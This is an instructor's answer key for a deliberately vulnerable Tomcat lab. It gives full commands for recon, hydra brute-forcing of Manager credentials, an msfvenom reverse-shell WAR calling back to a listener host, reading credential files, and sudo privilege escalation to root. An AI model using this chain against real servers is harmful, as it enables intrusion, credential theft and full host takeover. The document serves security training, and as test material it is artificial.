# Solution — 03 Orionline Deploy (easy, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is Tomcat's default landing page (`Apache Tomcat/9.0.x` — the version fingerprint).
`GET /manager/html` is the Manager UI and `GET /manager/text/*` its scripting API; both answer
from the whole lab network because the stock `RemoteAddrValve` loopback lock was commented out
of `webapps/manager/META-INF/context.xml`. `GET /host-manager/html` is exposed the same way.
Tomcat runs as the unprivileged `deploy` OS user.

## Intended chain

### 1. Enumerate the Manager (vector recon)

```sh
nmap -sV -p 8503 127.0.0.1
whatweb http://127.0.0.1:8503/
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8503/manager/html   # 401 -> auth, reachable
```

A `401` (not `403`) confirms the Manager is reachable off-box and only a password stands in
the way — the RemoteAddrValve would have returned `403`.

### 2. Brute the Manager credentials (vector B)

The Manager uses HTTP Basic auth. Brute it with the shipped `wordlist.txt`:

```sh
# hydra against Basic auth on /manager/html
hydra -L users.txt -P wordlist.txt -s 8503 127.0.0.1 \
  http-get '/manager/html:F=401 Unauthorized'
# users.txt = tomcat\nadmin\n

# or just confirm by hand
curl -s -o /dev/null -w '%{http_code}\n' -u tomcat:s3cret http://127.0.0.1:8503/manager/html   # 200
```

Recovered: **`tomcat:s3cret`** (roles `manager-gui` + `manager-script`) and **`admin:admin`**
(`manager-gui`). `s3cret` is the entry hidden in `wordlist.txt`; `tomcat` and `admin` are the
usernames to try (Tomcat's own conventional names). Metasploit's
`auxiliary/scanner/http/tomcat_mgr_login` with the same list finds them too.

### 3. Deploy a webshell WAR → RCE → reverse shell (vector J)

With `manager-script` you can deploy a WAR over the text API. Build a JSP reverse-shell WAR
with msfvenom and push it:

```sh
# attacker listener
nc -lvnp 4444

# build the WAR (LHOST = your lab-side address reachable from the container)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.20.3.1 LPORT=4444 -f war -o shell.war

# deploy via the Manager text API (manager-script role)
curl -s -u tomcat:s3cret \
  --upload-file shell.war \
  'http://127.0.0.1:8503/manager/text/deploy?path=/shell&update=true'
#   -> OK - Deployed application at context path [/shell]

# trigger it (any path under the app invokes the JSP payload)
curl -s http://127.0.0.1:8503/shell/
```

The listener catches a shell **as the `deploy` user** (Tomcat's runtime account). Metasploit's
`exploit/multi/http/tomcat_mgr_upload` (set `HttpUsername`/`HttpPassword` to `tomcat:s3cret`,
`RPORT 8503`) automates the identical deploy-and-trigger and hands back a Meterpreter session.

A simpler non-Metasploit variant: zip a `cmd.jsp` command webshell into `shell.war`, deploy the
same way, then `curl 'http://127.0.0.1:8503/shell/cmd.jsp?c=id'`.

### 4. Loot the host + privesc to root (vector K)

From the `deploy` shell, read the planted secrets and escalate:

```sh
id                                                  # uid=1000(deploy)
cat /opt/orionline/config/credentials.properties    # DB password + backup API token
cat /usr/local/tomcat/conf/tomcat-users.xml          # the Manager creds, now confirmed

sudo -l                                             # (root) NOPASSWD: /opt/orionline/bin/deploy-release.sh
ls -l /opt/orionline/bin/deploy-release.sh           # -rwxrwxrwx root root  <-- world-writable
```

The sudoers rule `/etc/sudoers.d/deploy` lets `deploy` run `deploy-release.sh` as root with no
password, **and that script is world-writable**. Overwrite it, then invoke it through sudo:

```sh
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /opt/orionline/bin/deploy-release.sh
sudo /opt/orionline/bin/deploy-release.sh
/tmp/rootbash -p        # euid=0 -> root
# (or simply: echo '#!/bin/bash\nbash -i' > ...deploy-release.sh ; sudo ...deploy-release.sh)
```

## Planted privesc artifact

| artifact | path | how it grants root |
|----------|------|--------------------|
| sudoers rule | `/etc/sudoers.d/deploy` (0440, root) | `deploy ALL=(root) NOPASSWD: /opt/orionline/bin/deploy-release.sh` |
| release script | `/opt/orionline/bin/deploy-release.sh` (**0777**, root) | world-writable + sudo-runnable as root: rewrite it, `sudo` it, root executes attacker content |

The sudoers *file* itself is correctly locked `0440` (sudo refuses a writable policy); the bug
is that the **target** of the NOPASSWD rule is world-writable.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `manager-weak-cred` | weak Manager password `s3cret` | `/usr/local/tomcat/conf/tomcat-users.xml` |
| `tomcat-fingerprint` | `Apache Tomcat` on the default root page | `GET http://127.0.0.1:8503/` |
| `db-credentials` | `orionline-db-prod-9f3a2c` (DB pw) + `orio_live_…` API token | `/opt/orionline/config/credentials.properties` |

Creds: `tomcat:s3cret` (manager-gui + manager-script), `admin:admin` (manager-gui + admin-gui).

## Reset

`make lab-restore LAB=03-easy-tomcat` (recreate — drops the container and rebuilds pristine).
